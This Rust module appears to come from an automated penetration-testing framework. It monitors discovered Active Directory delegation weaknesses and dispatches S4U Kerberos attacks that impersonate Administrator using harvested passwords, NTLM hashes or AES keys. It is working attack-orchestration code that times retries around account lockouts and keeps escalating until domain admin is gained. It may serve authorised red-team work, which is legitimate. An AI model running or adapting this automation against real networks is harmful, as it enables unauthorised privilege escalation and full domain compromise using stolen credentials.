//! auto_s4u_exploitation -- exploit delegation vulnerabilities via S4U.
//!
//! When constrained or RBCD delegation vulnerabilities are discovered (via
//! `find_delegation` or BloodHound), this automation dispatches S4U attacks
//! using available credentials for the delegating account.
//!
//! NOTE: Unconstrained delegation is handled by `auto_unconstrained_exploitation`
//! which orchestrates the coerce → dump → secretsdump chain.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tokio::time::Instant;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;

/// Cooldown after a failed S4U attempt before retrying the same vuln.
/// Set to 5 minutes to wait for AD account lockout to expire.
const S4U_FAILURE_COOLDOWN: Duration = Duration::from_secs(300);

/// Maximum consecutive failures before giving up on a vuln.
/// Set higher than the expected number of spray-induced lockouts
/// so that S4U can eventually succeed once sprays stop re-locking.
const S4U_MAX_FAILURES: u32 = 6;

/// Kerberos/SMB errors that indicate an account is permanently disabled/revoked.
/// These should permanently block the vuln — no point retrying.
const PERMANENT_REVOCATION_PATTERNS: &[&str] = &["STATUS_ACCOUNT_DISABLED", "KDC_ERR_KEY_EXPIRED"];

/// Kerberos/SMB errors that indicate a temporary lockout.
/// These should count as failures but NOT permanently block — the lockout expires.
const LOCKOUT_PATTERNS: &[&str] = &["KDC_ERR_CLIENT_REVOKED", "STATUS_ACCOUNT_LOCKED_OUT"];

/// Monitors for delegation vulnerabilities and dispatches S4U attacks.
/// Interval: 20s.
pub async fn auto_s4u_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let deleg_notify = dispatcher.delegation_notify.clone();
    let cred_notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(20));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    // Track dispatch attempts per vuln to prevent infinite retry loops.
    // Maps vuln_id -> (last_dispatch_time, failure_count)
    let mut dispatch_tracker: HashMap<String, (Instant, u32)> = HashMap::new();

    // Track task_id -> vuln_id so we can check completed task results for
    // revocation errors and immediately stop retrying those vulns.
    let mut task_vuln_map: HashMap<String, String> = HashMap::new();

    loop {
        // Wake on: timer tick, new delegation vuln, OR new credential (so S4U fires
        // immediately when a constrained delegation account's password is cracked).
        tokio::select! {
            _ = interval.tick() => {},
            _ = deleg_notify.notified() => {},
            _ = cred_notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Check completed tasks for revocation/lockout errors.
        // - Permanent revocation (disabled account) → block forever.
        // - Temporary lockout → just count the failure, let cooldown handle retry.
        {
            let state = dispatcher.state.read().await;
            let finished: Vec<String> = task_vuln_map
                .keys()
                .filter(|tid| state.completed_tasks.contains_key(tid.as_str()))
                .cloned()
                .collect();
            for tid in finished {
                if let Some(result) = state.completed_tasks.get(&tid) {
                    if has_permanent_revocation(result) {
                        if let Some(vid) = task_vuln_map.remove(&tid) {
                            warn!(
                                task_id = %tid,
                                vuln_id = %vid,
                                "S4U blocked: account permanently disabled — no further retries"
                            );
                            dispatch_tracker.entry(vid).or_insert((Instant::now(), 0)).1 =
                                S4U_MAX_FAILURES;
                        }
                    } else if has_lockout_error(result) {
                        if let Some(vid) = task_vuln_map.remove(&tid) {
                            debug!(
                                task_id = %tid,
                                vuln_id = %vid,
                                "S4U lockout detected — will retry after cooldown"
                            );
                            // Don't increment failure count beyond what dispatch already counted.
                            // The cooldown timer is already set from dispatch time.
                        }
                    } else {
                        // Success or non-revocation error — reset failure count so
                        // subsequent dispatches aren't permanently blocked by the
                        // S4U_MAX_FAILURES threshold.
                        if let Some(vid) = task_vuln_map.remove(&tid) {
                            if let Some(entry) = dispatch_tracker.get_mut(&vid) {
                                entry.1 = 0;
                            }
                        }
                    }
                }
            }
        }

        let work: Vec<S4uWork> = {
            let state = dispatcher.state.read().await;

            // Skip if already domain admin
            if state.has_domain_admin {
                continue;
            }

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    let vtype = vuln.vuln_type.to_lowercase();
                    if vtype != "constrained_delegation" && vtype != "rbcd" {
                        return None;
                    }

                    // Already exploited?
                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    // Check dispatch cooldown — skip if recently dispatched and failed
                    if let Some((last_time, failures)) = dispatch_tracker.get(&vuln.vuln_id) {
                        if *failures >= S4U_MAX_FAILURES {
                            debug!(
                                vuln_id = %vuln.vuln_id,
                                failures = *failures,
                                "S4U skipped: max failures reached"
                            );
                            return None;
                        }
                        if last_time.elapsed() < S4U_FAILURE_COOLDOWN {
                            return None; // Still in cooldown
                        }
                    }

                    // Extract the delegating account name from details
                    let account_name = vuln
                        .details
                        .get("account_name")
                        .and_then(|v| v.as_str())
                        .or_else(|| vuln.details.get("AccountName").and_then(|v| v.as_str()))
                        .map(|s| s.to_string());

                    let target_spn = vuln
                        .details
                        .get("delegation_target")
                        .and_then(|v| v.as_str())
                        .or_else(|| {
                            vuln.details
                                .get("AllowedToDelegate")
                                .and_then(|v| v.as_str())
                        })
                        .map(|s| s.to_string());

                    // Find a credential or hash for the delegating account
                    let credential = account_name.as_ref().and_then(|acct| {
                        state
                            .credentials
                            .iter()
                            .find(|c| c.username.to_lowercase() == acct.to_lowercase())
                            .cloned()
                    });

                    let hash = account_name.as_ref().and_then(|acct| {
                        state
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == acct.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned()
                    });

                    // Need at least a credential or hash to perform S4U
                    if credential.is_none() && hash.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            vuln_type = %vuln.vuln_type,
                            account = ?account_name,
                            "S4U skipped: no credential or hash for delegating account"
                        );
                        return None;
                    }

                    // Resolve domain and DC IP
                    let domain = credential
                        .as_ref()
                        .map(|c| c.domain.clone())
                        .or_else(|| hash.as_ref().map(|h| h.domain.clone()))
                        .unwrap_or_default();

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    Some(S4uWork {
                        vuln: vuln.clone(),
                        credential,
                        hash,
                        target_spn,
                        domain,
                        dc_ip,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "s4u_attack",
                "vuln_type": item.vuln.vuln_type,
                "target": item.vuln.target,
                "domain": item.domain,
                "impersonate": "Administrator",
            });

            if let Some(ref spn) = item.target_spn {
                payload["target_spn"] = json!(spn);
            }
            if let Some(ref dc) = item.dc_ip {
                payload["target_ip"] = json!(dc);
            }

            // Attach credential or hash — provide both flat fields (for prompt
            // builders) and nested credential object (for structured extraction).
            if let Some(ref cred) = item.credential {
                payload["username"] = json!(cred.username);
                payload["password"] = json!(cred.password);
                payload["account_name"] = json!(cred.username);
                payload["credential"] = json!({
                    "username": cred.username,
                    "password": cred.password,
                    "domain": cred.domain,
                });
            } else if let Some(ref hash) = item.hash {
                payload["hash"] = json!(hash.hash_value);
                payload["username"] = json!(hash.username);
                if let Some(ref aes) = hash.aes_key {
                    payload["aes_key"] = json!(aes);
                }
            }

            let vuln_id = item.vuln.vuln_id.clone();
            // Attach vuln_id so result processing can mark_exploited on success
            payload["vuln_id"] = json!(&vuln_id);

            // Priority 10 = highest — S4U must run before other agents use the
            // credential and potentially lock out the account.
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, 10)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %vuln_id,
                        vuln_type = %item.vuln.vuln_type,
                        "S4U exploitation dispatched"
                    );
                    // Record dispatch — increment failure count (reset on next success).
                    // The cooldown prevents rapid re-dispatch if it fails.
                    let entry = dispatch_tracker
                        .entry(vuln_id.clone())
                        .or_insert((Instant::now(), 0));
                    entry.0 = Instant::now();
                    entry.1 += 1;
                    // Track task → vuln so we can check for revocation on completion.
                    task_vuln_map.insert(task_id, vuln_id);
                }
                Ok(None) => {
                    debug!(vuln_id = %vuln_id, "S4U task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, vuln_id = %vuln_id, "Failed to dispatch S4U exploit")
                }
            }
        }
    }
}

struct S4uWork {
    vuln: ares_core::models::VulnerabilityInfo,
    credential: Option<ares_core::models::Credential>,
    hash: Option<ares_core::models::Hash>,
    target_spn: Option<String>,
    domain: String,
    dc_ip: Option<String>,
}

/// Check whether a task result matches any of the given error patterns.
fn result_matches_patterns(result: &ares_core::models::TaskResult, patterns: &[&str]) -> bool {
    let payload = match &result.result {
        Some(v) => v,
        None => return false,
    };

    // Check error field
    if let Some(err) = &result.error {
        if patterns.iter().any(|p| err.contains(p)) {
            return true;
        }
    }

    // Check raw tool outputs (array of strings embedded in the result payload)
    if let Some(outputs) = payload.get("tool_outputs").and_then(|v| v.as_array()) {
        for output in outputs {
            if let Some(text) = output.as_str() {
                if patterns.iter().any(|p| text.contains(p)) {
                    return true;
                }
            }
        }
    }

    // Check summary/result text
    for key in &["summary", "output", "tool_output"] {
        if let Some(text) = payload.get(*key).and_then(|v| v.as_str()) {
            if patterns.iter().any(|p| text.contains(p)) {
                return true;
            }
        }
    }

    false
}

/// Account is permanently disabled — no point retrying.
fn has_permanent_revocation(result: &ares_core::models::TaskResult) -> bool {
    result_matches_patterns(result, PERMANENT_REVOCATION_PATTERNS)
}

/// Account is temporarily locked out — will unlock after AD lockout duration.
fn has_lockout_error(result: &ares_core::models::TaskResult) -> bool {
    result_matches_patterns(result, LOCKOUT_PATTERNS)
}
